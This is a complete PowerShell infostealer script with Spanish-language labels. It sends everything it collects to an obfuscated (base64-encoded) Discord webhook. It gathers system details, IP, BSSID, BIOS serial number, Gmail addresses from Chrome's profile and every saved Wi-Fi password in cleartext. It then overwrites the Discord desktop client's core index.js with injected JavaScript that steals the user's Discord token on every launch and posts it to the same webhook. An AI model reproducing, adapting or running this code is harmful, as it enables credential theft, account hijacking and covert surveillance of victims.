if ($IsMacOS -or $IsLinux -or $env:OSTYPE -like "*darwin*" -or $env:OSTYPE -like "*linux*") { exit }

$b64_tier1 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTQ5MjU1MjgxMzQ1MDg4NzMzOC83SURPTmdpZUJUZ2dSbUU4TWJtTXJBT1dwM3cxcEdJZ1NleVFjWl90UUlSOFJaeUdMUGNxX3FCc0N4aWtzZUlPOUlSMA=="
$w = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64_tier1))

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ip = try{(IWR api.ipify.org -TimeoutSec 5).Content}catch{'Unknown'}
$b = try{((netsh wlan show int|sls BSSID).ToString().Split(':')[1..6]-join':').Trim()}catch{'N/A'}
$h = (GWMI Win32_Processor).Name
$r = [math]::round((GWMI Win32_PhysicalMemory|Measure Capacity -Sum).Sum/1GB,0)
$s = (GWMI Win32_Bios).SerialNumber

$out = "REPORTE: $env:COMPUTERNAME ($env:USERNAME) | IP: $ip | BSSID: $b`nHW: $h | RAM: ${r}GB | SN: $s`n`nCUENTAS:`n"
$cp = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
if(Test-Path $cp){
    $emails = [regex]::Matches((GC $cp -Raw),'[\w\.-]+@gmail\.com') | %{$_.Value} | select -Unique
    foreach($e in $emails){$out += "- $e`n"}
}
$out += "`nWIFI:`n"
$pr = (netsh wlan show prof | sls '\:(.+)$' | %{$_.Matches.Groups[1].Value.Trim()})
foreach($n in $pr){
    $v = netsh wlan show prof name="$n" key=clear | sls 'Key Content|Contenido'
    if($v){$p = $v.ToString().Split(':')[1].Trim(); $out += "SSID: $n | Pass: $p`n"}
}

$j = @{content='```' + $out + '```'} | ConvertTo-Json
try { Invoke-RestMethod -Uri $w -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($j)) -ContentType 'application/json' -UserAgent 'Mozilla/5.0' } catch {}

Stop-Process -Name Discord -Force -ErrorAction SilentlyContinue
$f = (Get-ChildItem -Path "$env:LOCALAPPDATA\Discord\app-*" -Filter "index.js" -Recurse | Where-Object {$_.FullName -like "*discord_desktop_core*"} | Select-Object -ExpandProperty FullName -First 1)

if($f){
    $parte1 = 'const {app,net}=require("electron"),U="'
    $js_payload = @'
    (function(){
        const getT=()=>{
            try{
                let t;
                window.webpackChunkdiscord_app.push([[Math.random()],{},(r)=>{
                    for(const m of Object.keys(r.c).map(x=>r.c[x].exports)){
                        if(m&&m.default&&typeof m.default.getToken=="function"){t=m.default.getToken()}
                    }
                }]);
                if(t){
                    fetch("https://discord.com/api/v9/users/@me",{headers:{"Authorization":t}})
                    .then(r=>r.json()).then(u=>{
                        console.log("DATA:"+u.username+"#"+u.discriminator+" ID:"+t);
                    });
                    return true;
                }
            }catch(e){}
            return false;
        };
        if(!getT()){const i=setInterval(()=>{if(getT())clearInterval(i)},1000)}
    })()
'@.Replace("`n","").Replace("`r","")

    $parte2 = '";let l=null;app.on("browser-window-created",(e,w)=>{w.webContents.on("did-finish-load",()=>{w.webContents.executeJavaScript(`' + $js_payload + '`)});w.webContents.on("console-message",(e,lvl,m)=>{if(m.startsWith("DATA:")){const d=m.split("DATA:")[1];if(d!==l){l=d;const r=net.request({method:"POST",url:U});r.setHeader("Content-Type","application/json");r.write(JSON.stringify({content:"**User:** `"+d.split(" ID:")[0]+"`\n**Token:** `"+d.split(" ID:")[1]+"`"}));r.end()}}})});module.exports=require("./core.asar");'
    
    $js_final = $parte1 + $w + $parte2
    [System.IO.File]::WriteAllText($f, $js_final)
    Start-Process "$env:LOCALAPPDATA\Discord\Update.exe" "-processStart Discord.exe"
}
